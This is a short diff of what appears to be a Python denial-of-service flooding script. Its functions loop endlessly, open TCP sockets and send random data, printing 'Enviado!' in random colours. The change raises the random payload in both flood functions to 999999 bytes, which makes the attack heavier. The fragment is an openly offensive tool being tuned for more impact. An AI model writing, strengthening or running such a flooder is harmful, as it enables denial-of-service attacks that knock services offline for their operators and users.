@@ -54,7 +54,7 @@ threads = args['threads']
 #METHOD1
 def run():
     u = random.choice((Fore.GREEN + " Enviado!", Fore.RED + " Enviado!", Fore.BLUE + " Enviado!"))
-    data = random._urandom(1024)
+    data = random._urandom(999999)
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
@@ -70,7 +70,7 @@ def run():
 def run2():
     i = random.choice(("[*]","[!]","[#]"))   
     u = random.choice((Fore.GREEN + " Enviado!", Fore.RED + " Enviado!", Fore.BLUE + " Enviado!"))
-    data = random._urandom(16)
+    data = random._urandom(999999)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
